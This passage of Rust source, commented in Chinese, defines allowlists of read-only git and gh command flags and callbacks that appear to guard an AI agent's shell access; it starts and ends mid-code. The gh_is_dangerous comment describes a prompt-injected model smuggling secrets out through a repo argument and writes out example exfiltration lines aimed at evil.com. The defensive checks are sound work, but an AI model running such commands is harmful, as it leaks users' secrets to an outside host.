    ("--long", FlagArgType::None), // 总是输出长格式（tag-distance-ghash）
    ("--abbrev", FlagArgType::Number), // 缩写对象名到 N 位十六进制
    ("--always", FlagArgType::None), // 无 tag 时输出唯一缩写对象作为兜底
    ("--contains", FlagArgType::None), // 查找提交之后的 tag
    ("--first-match", FlagArgType::None), // 偏好最近的 tip（首个匹配后停止）
    ("--exact-match", FlagArgType::None), // 仅精确匹配时输出（tag 指向提交）
    ("--candidates", FlagArgType::Number), // 选择最佳候选前的遍历上限
    // 后缀/dirty 标记
    ("--dirty", FlagArgType::None), // 工作区有修改时追加 "-dirty"
    ("--broken", FlagArgType::None), // 仓库处于非法状态时追加 "-broken"
];

const GIT_CAT_FILE_FLAGS: &[(&str, FlagArgType)] = &[
    // 对象查询模式（全部纯只读）
    ("-t", FlagArgType::None), // 打印对象类型
    ("-s", FlagArgType::None), // 打印对象大小
    ("-p", FlagArgType::None), // 美化打印对象内容
    ("-e", FlagArgType::None), // 对象存在时退出码为 0，否则非 0
    // 批处理模式 — 仅只读 check 变体
    ("--batch-check", FlagArgType::None), // 对 stdin 每个对象打印类型和大小（无内容）
    // 输出控制
    ("--allow-undetermined-type", FlagArgType::None),
];

// NOTE: --batch（不带 --check）被故意排除 — 它从 stdin 读取任意对象，
// 在管道命令中可能被利用来 dump 敏感对象。

const GIT_FOR_EACH_REF_FLAGS: &[(&str, FlagArgType)] = &[
    // 输出格式化
    ("--format", FlagArgType::String), // 使用 %(fieldname) 占位符的格式串
    // 排序
    ("--sort", FlagArgType::String), // 按 key 排序（如 refname, creatordate, version:refname）
    // 限制
    ("--count", FlagArgType::Number), // 最多输出 N 个 ref
    // 过滤
    ("--contains", FlagArgType::String), // 仅列出包含指定提交的 ref
    ("--no-contains", FlagArgType::String), // 仅列出【不】包含指定提交的 ref
    ("--merged", FlagArgType::String), // 仅列出从指定提交可达的 ref
    ("--no-merged", FlagArgType::String), // 仅列出从指定提交【不可】达的 ref
    ("--points-at", FlagArgType::String), // 仅列出指向指定对象的 ref
];

const GIT_GREP_FLAGS: &[(&str, FlagArgType)] = &[
    // pattern 匹配模式
    ("-e", FlagArgType::String), // pattern
    ("-E", FlagArgType::None), // 扩展正则
    ("--extended-regexp", FlagArgType::None),
    ("-G", FlagArgType::None), // 基本正则（默认）
    ("--basic-regexp", FlagArgType::None),
    ("-F", FlagArgType::None), // 固定字符串
    ("--fixed-strings", FlagArgType::None),
    ("-P", FlagArgType::None), // Perl 正则
    ("--perl-regexp", FlagArgType::None),
    // 匹配控制
    ("-i", FlagArgType::None), // 忽略大小写
    ("--ignore-case", FlagArgType::None),
    ("-v", FlagArgType::None), // 反转匹配
    ("--invert-match", FlagArgType::None),
    ("-w", FlagArgType::None), // 单词正则
    ("--word-regexp", FlagArgType::None),
    // 输出控制
    ("-n", FlagArgType::None), // 行号
    ("--line-number", FlagArgType::None),
    ("-c", FlagArgType::None), // 计数
    ("--count", FlagArgType::None),
    ("-l", FlagArgType::None), // 匹配的文件
    ("--files-with-matches", FlagArgType::None),
    ("-L", FlagArgType::None), // 未匹配的文件
    ("--files-without-match", FlagArgType::None),
    ("-h", FlagArgType::None), // 无文件名
    ("-H", FlagArgType::None), // 带文件名
    ("--heading", FlagArgType::None),
    ("--break", FlagArgType::None),
    ("--full-name", FlagArgType::None),
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    ("-o", FlagArgType::None), // 仅匹配部分
    ("--only-matching", FlagArgType::None),
    // 上下文
    ("-A", FlagArgType::Number), // 之后上下文
    ("--after-context", FlagArgType::Number),
    ("-B", FlagArgType::Number), // 之前上下文
    ("--before-context", FlagArgType::Number),
    ("-C", FlagArgType::Number), // 上下文
    ("--context", FlagArgType::Number),
    // 多 pattern 布尔运算符
    ("--and", FlagArgType::None),
    ("--or", FlagArgType::None),
    ("--not", FlagArgType::None),
    // 范围控制
    ("--max-depth", FlagArgType::Number),
    ("--untracked", FlagArgType::None),
    ("--no-index", FlagArgType::None),
    ("--recurse-submodules", FlagArgType::None),
    ("--cached", FlagArgType::None),
    // 线程
    ("--threads", FlagArgType::Number),
    // 安静
    ("-q", FlagArgType::None),
    ("--quiet", FlagArgType::None),
];

const GIT_STASH_SHOW_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_STAT_FLAGS
    ("--stat", FlagArgType::None),
    ("--numstat", FlagArgType::None),
    ("--shortstat", FlagArgType::None),
    ("--name-only", FlagArgType::None),
    ("--name-status", FlagArgType::None),
    // GIT_COLOR_FLAGS
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    // GIT_PATCH_FLAGS
    ("--patch", FlagArgType::None),
    ("-p", FlagArgType::None),
    ("--no-patch", FlagArgType::None),
    ("--no-ext-diff", FlagArgType::None),
    ("-s", FlagArgType::None),
    // Diff 选项
    ("--word-diff", FlagArgType::None),
    ("--word-diff-regex", FlagArgType::String),
    ("--diff-filter", FlagArgType::String),
    ("--abbrev", FlagArgType::Number),
];

const GIT_WORKTREE_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    ("--porcelain", FlagArgType::None),
    ("-v", FlagArgType::None),
    ("--verbose", FlagArgType::None),
    ("--expire", FlagArgType::String),
];

const GIT_TAG_FLAGS: &[(&str, FlagArgType)] = &[
    // 列出模式 flag
    ("-l", FlagArgType::None),
    ("--list", FlagArgType::None),
    ("-n", FlagArgType::Number),
    ("--contains", FlagArgType::String),
    ("--no-contains", FlagArgType::String),
    ("--merged", FlagArgType::String),
    ("--no-merged", FlagArgType::String),
    ("--sort", FlagArgType::String),
    ("--format", FlagArgType::String),
    ("--points-at", FlagArgType::String),
    ("--column", FlagArgType::None),
    ("--no-column", FlagArgType::None),
    ("-i", FlagArgType::None),
    ("--ignore-case", FlagArgType::None),
];

const GIT_BRANCH_FLAGS: &[(&str, FlagArgType)] = &[
    // 列出模式 flag
    ("-l", FlagArgType::None),
    ("--list", FlagArgType::None),
    ("-a", FlagArgType::None),
    ("--all", FlagArgType::None),
    ("-r", FlagArgType::None),
    ("--remotes", FlagArgType::None),
    ("-v", FlagArgType::None),
    ("-vv", FlagArgType::None),
    ("--verbose", FlagArgType::None),
    // 显示选项
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    ("--column", FlagArgType::None),
    ("--no-column", FlagArgType::None),
    // SECURITY: --abbrev 保持 'number'，使 validateFlags 接受 --abbrev=N
    // （附着形式，安全）。分离形式 `--abbrev N` 是 bug：
    // git 使用 PARSE_OPT_OPTARG（仅可选附着）— 分离的 N 成为
    // 位置参数的分支名，创建 .git/refs/heads/N。validateFlags 的 'number'
    // 会消费 N，但下方回调会拦截：--abbrev 不在回调的 flagsWithArgs 中
    //（已移除），回调把 N 当作无 list flag 的位置参数 → 危险。
    // 双层防御：validateFlags 两种形式都接受，回调拦截分离形式。
    ("--abbrev", FlagArgType::Number),
    ("--no-abbrev", FlagArgType::None),
    // 过滤 - 这些接受提交/ref 参数
    ("--contains", FlagArgType::String),
    ("--no-contains", FlagArgType::String),
    ("--merged", FlagArgType::None), // 可选提交参数 - 在回调中处理
    ("--no-merged", FlagArgType::None), // 可选提交参数 - 在回调中处理
    ("--points-at", FlagArgType::String),
    // 排序
    ("--sort", FlagArgType::String),
    // 注意：--format 被故意排除，可能存在安全风险
    // 显示当前
    ("--show-current", FlagArgType::None),
    ("-i", FlagArgType::None),
    ("--ignore-case", FlagArgType::None),
];

pub static GIT_READ_ONLY_COMMANDS: Lazy<HashMap<&'static str, ExternalCommandConfig>> =
    Lazy::new(|| {
        let mut commands = HashMap::new();
        commands.insert(
            "git diff",
            ExternalCommandConfig::flags(GIT_DIFF_FLAGS),
        );
        commands.insert("git log", ExternalCommandConfig::flags(GIT_LOG_FLAGS));
        commands.insert("git show", ExternalCommandConfig::flags(GIT_SHOW_FLAGS));
        commands.insert(
            "git shortlog",
            ExternalCommandConfig::flags(GIT_SHORTLOG_FLAGS),
        );
        commands.insert(
            "git reflog",
            ExternalCommandConfig::flags(GIT_REFLOG_FLAGS)
                .with_callback(git_reflog_is_dangerous as DangerousCallback),
        );
        commands.insert(
            "git stash list",
            ExternalCommandConfig::flags(GIT_STASH_LIST_FLAGS),
        );
        commands.insert(
            "git ls-remote",
            ExternalCommandConfig::flags(GIT_LS_REMOTE_FLAGS),
        );
        commands.insert("git status", ExternalCommandConfig::flags(GIT_STATUS_FLAGS));
        commands.insert("git blame", ExternalCommandConfig::flags(GIT_BLAME_FLAGS));
        commands.insert(
            "git ls-files",
            ExternalCommandConfig::flags(GIT_LS_FILES_FLAGS),
        );
        commands.insert(
            "git config --get",
            ExternalCommandConfig::flags(GIT_CONFIG_GET_FLAGS),
        );
        // NOTE: 'git remote show' 必须在 'git remote' 之前注册，消费方按
        // 最长 key 优先匹配。Rust HashMap 无序，顺序仅作文档保留。
        commands.insert(
            "git remote show",
            ExternalCommandConfig::flags(GIT_REMOTE_SHOW_FLAGS)
                .with_callback(git_remote_show_is_dangerous as DangerousCallback),
        );
        commands.insert(
            "git remote",
            ExternalCommandConfig::flags(GIT_REMOTE_FLAGS)
                .with_callback(git_remote_is_dangerous as DangerousCallback),
        );
        // git merge-base 是只读命令，用于查找共同祖先
        commands.insert(
            "git merge-base",
            ExternalCommandConfig::flags(GIT_MERGE_BASE_FLAGS),
        );
        // git rev-parse 是纯读命令 — 把 ref 解析为 SHA、查询仓库路径
        commands.insert(
            "git rev-parse",
            ExternalCommandConfig::flags(GIT_REV_PARSE_FLAGS),
        );
        // git rev-list 是只读提交枚举 — 列出/计数从 ref 可达的提交
        commands.insert(
            "git rev-list",
            ExternalCommandConfig::flags(GIT_REV_LIST_FLAGS),
        );
        // git describe 是只读 — 相对最近 tag 描述提交
        commands.insert(
            "git describe",
            ExternalCommandConfig::flags(GIT_DESCRIBE_FLAGS),
        );
        // git cat-file 是只读对象查看 — 显示对象的类型、大小或内容
        commands.insert(
            "git cat-file",
            ExternalCommandConfig::flags(GIT_CAT_FILE_FLAGS),
        );
        // git for-each-ref 是只读 ref 遍历 — 可选格式化与过滤地列出 ref
        commands.insert(
            "git for-each-ref",
            ExternalCommandConfig::flags(GIT_FOR_EACH_REF_FLAGS),
        );
        // git grep 是只读 — 在跟踪文件中搜索 pattern
        commands.insert("git grep", ExternalCommandConfig::flags(GIT_GREP_FLAGS));
        // git stash show 是只读 — 显示某条 stash 的 diff
        commands.insert(
            "git stash show",
            ExternalCommandConfig::flags(GIT_STASH_SHOW_FLAGS),
        );
        // git worktree list 是只读 — 列出链接的 worktree
        commands.insert(
            "git worktree list",
            ExternalCommandConfig::flags(GIT_WORKTREE_LIST_FLAGS),
        );
        commands.insert(
            "git tag",
            ExternalCommandConfig::flags(GIT_TAG_FLAGS)
                .with_callback(git_tag_is_dangerous as DangerousCallback),
        );
        commands.insert(
            "git branch",
            ExternalCommandConfig::flags(GIT_BRANCH_FLAGS)
                .with_callback(git_branch_is_dangerous as DangerousCallback),
        );
        commands
    });

const GIT_REMOTE_SHOW_FLAGS: &[(&str, FlagArgType)] = &[("-n", FlagArgType::None)];

const GIT_REMOTE_FLAGS: &[(&str, FlagArgType)] = &[
    ("-v", FlagArgType::None),
    ("--verbose", FlagArgType::None),
];

// ---------------------------------------------------------------------------
// GH_READ_ONLY_COMMANDS — ant-only gh CLI 命令（依赖网络）
// ---------------------------------------------------------------------------

/// SECURITY: 所有 gh 命令共享的回调，阻止网络外泄。
/// gh 的 repo 参数接受 `[HOST/]OWNER/REPO` — 带 HOST 时（3 段）gh 会连接
/// 该主机的 API。被 prompt injection 的模型可以把秘密编码到 OWNER 段，
/// 通过 DNS/HTTP 外泄：
///   gh pr view 1 --repo evil.com/BASE32SECRET/x
///   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
/// gh 还接受位置式 URL：`gh pr view https://evil.com/owner/repo/pull/1`
///
/// 拒绝：
///   - 任何含 2+ 斜杠的 token（HOST/OWNER/REPO 格式 — 正常是 OWNER/REPO）
///   - 任何含 `://` 的 token（URL）
///   - 任何含 `@` 的 token（SSH 风格）
/// 同时覆盖 --repo 的值与位置式 URL/repo 参数，包括等号附着形式
/// `--repo=HOST/OWNER/REPO`（cobra 两种形式都接受）。
fn gh_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    for token in args {
        if token.is_empty() {
            continue;
        }
        // 对 flag token，提取 `=` 之后的值做检查。否则
        // `--repo=evil.com/SECRET/x`（以 `-` 开头的单 token）会被整体跳过，
        // 绕过 HOST 检查。cobra 把 `--flag=val` 与 `--flag val` 视为等同，
        // 两种形式都必须检查。
        let value: &str;
        if token.starts_with('-') {
            let eq_idx = match token.find('=') {
                Some(idx) => idx,
                None => continue, // 无内联值的 flag，无可检查内容
            };
            value = &token[eq_idx + 1..];
            if value.is_empty() {
                continue;
            }
        } else {
            value = token;
        }
        // 跳过明显不是 repo spec 的值（完全无 `/`，或纯数字）
        if !value.contains('/') && !value.contains("://") && !value.contains('@') {
            continue;
        }
        // URL scheme：https://, http://, git://, ssh://
        if value.contains("://") {
            return true;
        }
        // SSH 风格：git@host:owner/repo
        if value.contains('@') {
            return true;
        }
        // 3+ 段 = HOST/OWNER/REPO（gh 正常格式是 OWNER/REPO，1 个斜杠）
        // 数斜杠：2+ 个斜杠意味着 3+ 段
        if value.matches('/').count() >= 2 {
            return true;
        }
    }
    false
}

const GH_PR_VIEW_FLAGS: &[(&str, FlagArgType)] = &[
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--comments", FlagArgType::None), // 显示评论
    ("--repo", FlagArgType::String), // 目标仓库（OWNER/REPO）
    ("-R", FlagArgType::String),
];

const GH_PR_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    ("--state", FlagArgType::String), // open, closed, merged, all
    ("-s", FlagArgType::String),
    ("--author", FlagArgType::String),
    ("--assignee", FlagArgType::String),
    ("--label", FlagArgType::String),
    ("--limit", FlagArgType::Number),
    ("-L", FlagArgType::Number),
    ("--base", FlagArgType::String),
    ("--head", FlagArgType::String),
    ("--search", FlagArgType::String),
    ("--json", FlagArgType::String),
    ("--draft", FlagArgType::None),
    ("--app", FlagArgType::String),
    ("--repo", FlagArgType::String),
    ("-R", FlagArgType::String),
];

const GH_PR_DIFF_FLAGS: &[(&str, FlagArgType)] = &[
    ("--color", FlagArgType::String),
    ("--name-only", FlagArgType::None),
    ("--patch", FlagArgType::None),
    ("--repo", FlagArgType::String),
    ("-R", FlagArgType::String),
];

const GH_PR_CHECKS_FLAGS: &[(&str, FlagArgType)] = &[
    ("--watch", FlagArgType::None),
    ("--required", FlagArgType::None),
    ("--fail-fast", FlagArgType::None),
    ("--json", FlagArgType::String),
    ("--interval", FlagArgType::Number),
    ("--repo", FlagArgType::String),
    ("-R", FlagArgType::String),
];

const GH_ISSUE_VIEW_FLAGS: &[(&str, FlagArgType)] = &[
    ("--json", FlagArgType::String),
    ("--comments", FlagArgType::None),
    ("--repo", FlagArgType::String),
    ("-R", FlagArgType::String),
];

const GH_ISSUE_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    ("--state", FlagArgType::String),
    ("-s", FlagArgType::String),
    ("--assignee", FlagArgType::String),
    ("--author", FlagArgType::String),
    ("--label", FlagArgType::String),
    ("--limit", FlagArgType::Number),
    ("-L", FlagArgType::Number),
    ("--milestone", FlagArgType::String),
    ("--search", FlagArgType::String),
    ("--json", FlagArgType::String),
    ("--app", FlagArgType::String),
    ("--repo", FlagArgType::String),
    ("-R", FlagArgType::String),
];

const GH_REPO_VIEW_FLAGS: &[(&str, FlagArgType)] = &[("--json", FlagArgType::String)];

const GH_RUN_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    ("--branch", FlagArgType::String), // 按分支过滤
    ("-b", FlagArgType::String),
    ("--status", FlagArgType::String), // 按状态过滤
    ("-s", FlagArgType::String),
    ("--workflow", FlagArgType::String), // 按 workflow 过滤
    ("-w", FlagArgType::String), // NOTE: 这里 -w 是 --workflow，不是 --web（gh run list 无 --web）
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
    ("--event", FlagArgType::String), // 按事件类型过滤
    ("-e", FlagArgType::String),
    ("--user", FlagArgType::String), // 按用户过滤
    ("-u", FlagArgType::String),
    ("--created", FlagArgType::String), // 按创建日期过滤
    ("--commit", FlagArgType::String), // 按提交 SHA 过滤
    ("-c", FlagArgType::String),
];

const GH_RUN_VIEW_FLAGS: &[(&str, FlagArgType)] = &[
    ("--log", FlagArgType::None), // 显示完整运行日志
    ("--log-failed", FlagArgType::None), // 仅显示失败步骤的日志
    ("--exit-status", FlagArgType::None), // 以运行状态码退出
    ("--verbose", FlagArgType::None), // 显示 job 步骤
    ("-v", FlagArgType::None), // NOTE: 这里 -v 是 --verbose，不是 --web
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
    ("--job", FlagArgType::String), // 按 ID 查看特定 job
    ("-j", FlagArgType::String),
    ("--attempt", FlagArgType::Number), // 查看特定尝试
    ("-a", FlagArgType::Number),
];

const GH_AUTH_STATUS_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --show-token/-t 被故意排除（泄漏秘密）
    ("--active", FlagArgType::None), // 仅显示当前账号
    ("-a", FlagArgType::None),
    ("--hostname", FlagArgType::String), // 检查特定主机名
    ("-h", FlagArgType::String),
    ("--json", FlagArgType::String), // JSON 字段选择
];

const GH_PR_STATUS_FLAGS: &[(&str, FlagArgType)] = &[
    ("--conflict-status", FlagArgType::None), // 显示合并冲突状态
    ("-c", FlagArgType::None),
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_ISSUE_STATUS_FLAGS: &[(&str, FlagArgType)] = &[
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_RELEASE_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    ("--exclude-drafts", FlagArgType::None), // 排除草稿 release
    ("--exclude-pre-releases", FlagArgType::None), // 排除预发布
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--order", FlagArgType::String), // 排序：asc|desc
    ("-O", FlagArgType::String),
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_RELEASE_VIEW_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_WORKFLOW_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    ("--all", FlagArgType::None), // 包含已禁用的 workflow
    ("-a", FlagArgType::None),
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_WORKFLOW_VIEW_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--ref", FlagArgType::String), // workflow 版本所在的分支/tag
    ("-r", FlagArgType::String),
    ("--yaml", FlagArgType::None), // 查看 workflow yaml
    ("-y", FlagArgType::None),
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_LABEL_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--order", FlagArgType::String), // 排序：asc|desc
    ("--search", FlagArgType::String), // 搜索 label 名
    ("-S", FlagArgType::String),
    ("--sort", FlagArgType::String), // 排序：created|name
    ("--repo", FlagArgType::String), // 目标仓库
    ("-R", FlagArgType::String),
];

const GH_SEARCH_REPOS_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--archived", FlagArgType::None), // 按归档状态过滤
    ("--created", FlagArgType::String), // 按创建日期过滤
    ("--followers", FlagArgType::String), // 按关注者数过滤
    ("--forks", FlagArgType::String), // 按 fork 数过滤
    ("--good-first-issues", FlagArgType::String), // 按 good first issue 数过滤
    ("--help-wanted-issues", FlagArgType::String), // 按 help wanted issue 数过滤
    ("--include-forks", FlagArgType::String), // 包含 fork：false|true|only
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--language", FlagArgType::String), // 按语言过滤
    ("--license", FlagArgType::String), // 按许可证过滤
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--match", FlagArgType::String), // 限定字段：name|description|readme
    ("--number-topics", FlagArgType::String), // 按 topic 数过滤
    ("--order", FlagArgType::String), // 排序：asc|desc
    ("--owner", FlagArgType::String), // 按所有者过滤
    ("--size", FlagArgType::String), // 按大小范围过滤
    ("--sort", FlagArgType::String), // 排序：forks|help-wanted-issues|stars|updated
    ("--stars", FlagArgType::String), // 按 star 数过滤
    ("--topic", FlagArgType::String), // 按 topic 过滤
    ("--updated", FlagArgType::String), // 按更新日期过滤
    ("--visibility", FlagArgType::String), // 过滤：public|private|internal
];

const GH_SEARCH_ISSUES_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--app", FlagArgType::String), // 按 GitHub App 作者过滤
    ("--assignee", FlagArgType::String), // 按指派人过滤
    ("--author", FlagArgType::String), // 按作者过滤
    ("--closed", FlagArgType::String), // 按关闭日期过滤
    ("--commenter", FlagArgType::String), // 按评论者过滤
    ("--comments", FlagArgType::String), // 按评论数过滤
    ("--created", FlagArgType::String), // 按创建日期过滤
    ("--include-prs", FlagArgType::None), // 结果中包含 PR
    ("--interactions", FlagArgType::String), // 按互动数过滤
    ("--involves", FlagArgType::String), // 按参与度过滤
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--label", FlagArgType::String), // 按 label 过滤
    ("--language", FlagArgType::String), // 按语言过滤
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--locked", FlagArgType::None), // 过滤锁定的对话
    ("--match", FlagArgType::String), // 限定字段：title|body|comments
    ("--mentions", FlagArgType::String), // 按用户提及过滤
    ("--milestone", FlagArgType::String), // 按里程碑过滤
    ("--no-assignee", FlagArgType::None), // 过滤缺失指派人
    ("--no-label", FlagArgType::None), // 过滤缺失 label
    ("--no-milestone", FlagArgType::None), // 过滤缺失里程碑
    ("--no-project", FlagArgType::None), // 过滤缺失项目
    ("--order", FlagArgType::String), // 排序：asc|desc
    ("--owner", FlagArgType::String), // 按所有者过滤
    ("--project", FlagArgType::String), // 按项目过滤
    ("--reactions", FlagArgType::String), // 按反应数过滤
    ("--repo", FlagArgType::String), // 按仓库过滤
    ("-R", FlagArgType::String),
    ("--sort", FlagArgType::String), // 排序字段
    ("--state", FlagArgType::String), // 过滤：open|closed
    ("--team-mentions", FlagArgType::String), // 按团队提及过滤
    ("--updated", FlagArgType::String), // 按更新日期过滤
    ("--visibility", FlagArgType::String), // 过滤：public|private|internal
];

const GH_SEARCH_PRS_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--app", FlagArgType::String), // 按 GitHub App 作者过滤
    ("--assignee", FlagArgType::String), // 按指派人过滤
    ("--author", FlagArgType::String), // 按作者过滤
    ("--base", FlagArgType::String), // 按基分支过滤
    ("-B", FlagArgType::String),
    ("--checks", FlagArgType::String), // 按检查状态过滤
    ("--closed", FlagArgType::String), // 按关闭日期过滤
    ("--commenter", FlagArgType::String), // 按评论者过滤
    ("--comments", FlagArgType::String), // 按评论数过滤
    ("--created", FlagArgType::String), // 按创建日期过滤
    ("--draft", FlagArgType::None), // 过滤草稿 PR
    ("--head", FlagArgType::String), // 按 head 分支过滤
    ("-H", FlagArgType::String),
    ("--interactions", FlagArgType::String), // 按互动数过滤
    ("--involves", FlagArgType::String), // 按参与度过滤
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--label", FlagArgType::String), // 按 label 过滤
    ("--language", FlagArgType::String), // 按语言过滤
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--locked", FlagArgType::None), // 过滤锁定的对话
    ("--match", FlagArgType::String), // 限定字段：title|body|comments
    ("--mentions", FlagArgType::String), // 按用户提及过滤
    ("--merged", FlagArgType::None), // 过滤已合并 PR
    ("--merged-at", FlagArgType::String), // 按合并日期过滤
    ("--milestone", FlagArgType::String), // 按里程碑过滤
    ("--no-assignee", FlagArgType::None), // 过滤缺失指派人
    ("--no-label", FlagArgType::None), // 过滤缺失 label
    ("--no-milestone", FlagArgType::None), // 过滤缺失里程碑
    ("--no-project", FlagArgType::None), // 过滤缺失项目
    ("--order", FlagArgType::String), // 排序：asc|desc
    ("--owner", FlagArgType::String), // 按所有者过滤
    ("--project", FlagArgType::String), // 按项目过滤
    ("--reactions", FlagArgType::String), // 按反应数过滤
    ("--repo", FlagArgType::String), // 按仓库过滤
    ("-R", FlagArgType::String),
    ("--review", FlagArgType::String), // 按审查状态过滤
    ("--review-requested", FlagArgType::String), // 按被请求审查过滤
    ("--reviewed-by", FlagArgType::String), // 按审查者过滤
    ("--sort", FlagArgType::String), // 排序字段
    ("--state", FlagArgType::String), // 过滤：open|closed
    ("--team-mentions", FlagArgType::String), // 按团队提及过滤
    ("--updated", FlagArgType::String), // 按更新日期过滤
    ("--visibility", FlagArgType::String), // 过滤：public|private|internal
];

const GH_SEARCH_COMMITS_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--author", FlagArgType::String), // 按作者过滤
    ("--author-date", FlagArgType::String), // 按创作日期过滤
    ("--author-email", FlagArgType::String), // 按作者邮箱过滤
    ("--author-name", FlagArgType::String), // 按作者姓名过滤
    ("--committer", FlagArgType::String), // 按提交者过滤
    ("--committer-date", FlagArgType::String), // 按提交日期过滤
    ("--committer-email", FlagArgType::String), // 按提交者邮箱过滤
    ("--committer-name", FlagArgType::String), // 按提交者姓名过滤
    ("--hash", FlagArgType::String), // 按提交哈希过滤
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--merge", FlagArgType::None), // 过滤合并提交
    ("--order", FlagArgType::String), // 排序：asc|desc
    ("--owner", FlagArgType::String), // 按所有者过滤
    ("--parent", FlagArgType::String), // 按父哈希过滤
    ("--repo", FlagArgType::String), // 按仓库过滤
    ("-R", FlagArgType::String),
    ("--sort", FlagArgType::String), // 排序：author-date|committer-date
    ("--tree", FlagArgType::String), // 按 tree 哈希过滤
    ("--visibility", FlagArgType::String), // 过滤：public|private|internal
];

const GH_SEARCH_CODE_FLAGS: &[(&str, FlagArgType)] = &[
    // NOTE: --web/-w 被故意排除（打开浏览器）
    ("--extension", FlagArgType::String), // 按文件扩展名过滤
    ("--filename", FlagArgType::String), // 按文件名过滤
    ("--json", FlagArgType::String), // JSON 字段选择
    ("--language", FlagArgType::String), // 按语言过滤
    ("--limit", FlagArgType::Number), // 最大结果数
    ("-L", FlagArgType::Number),
    ("--match", FlagArgType::String), // 限定：file|path
    ("--owner", FlagArgType::String), // 按所有者过滤
    ("--repo", FlagArgType::String), // 按仓库过滤
    ("-R", FlagArgType::String),
    ("--size", FlagArgType::String), // 按大小范围过滤
];

pub static GH_READ_ONLY_COMMANDS: Lazy<HashMap<&'static str, ExternalCommandConfig>> =
    Lazy::new(|| {
        let mut commands = HashMap::new();
        // gh pr view 是只读 — 显示 PR 详情
        commands.insert(
            "gh pr view",
            ExternalCommandConfig::flags(GH_PR_VIEW_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh pr list 是只读 — 列出 PR
        commands.insert(
            "gh pr list",
            ExternalCommandConfig::flags(GH_PR_LIST_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh pr diff 是只读 — 显示 PR diff
        commands.insert(
            "gh pr diff",
            ExternalCommandConfig::flags(GH_PR_DIFF_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh pr checks 是只读 — 显示 CI 状态检查
        commands.insert(
            "gh pr checks",
            ExternalCommandConfig::flags(GH_PR_CHECKS_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh issue view 是只读 — 显示 issue 详情
        commands.insert(
            "gh issue view",
            ExternalCommandConfig::flags(GH_ISSUE_VIEW_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh issue list 是只读 — 列出 issue
        commands.insert(
            "gh issue list",
            ExternalCommandConfig::flags(GH_ISSUE_LIST_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh repo view 是只读 — 显示仓库详情
        // NOTE: gh repo view 用位置参数，不用 --repo/-R flag
        commands.insert(
            "gh repo view",
            ExternalCommandConfig::flags(GH_REPO_VIEW_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh run list 是只读 — 列出 workflow 运行
        commands.insert(
            "gh run list",
            ExternalCommandConfig::flags(GH_RUN_LIST_FLAGS)
                .with_callback(gh_is_dangerous as DangerousCallback),
        );
        // gh run view 是只读 — 显示 workflow 运行详情
        commands.insert(
            "gh run view",
            ExternalCommandConfig::flags(GH_RUN_VIEW_FLAGS)
